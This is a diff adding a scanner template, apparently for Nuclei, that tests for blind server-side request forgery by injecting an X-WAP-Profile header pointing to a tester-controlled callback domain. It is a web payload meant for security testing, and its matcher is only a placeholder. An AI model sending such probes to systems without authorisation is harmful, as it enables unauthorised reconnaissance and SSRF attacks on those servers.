@@ -1,0 +1,23 @@
+id: 0x143
+
+info:
+  name: Blind SSRF
+  author: 0xAwali
+  severity: info
+
+requests:
+  - raw:
+    - |+
+      GET / HTTP/1.0
+      Host: {{Hostname}}
+      X-WAP-Profile: http://{{Host}}.{{Port}}.BSSRF-143.{{MY-DOMAIN}}/file.xml
+      Cache-Control: no-transform
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+
+    unsafe: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Your Match"
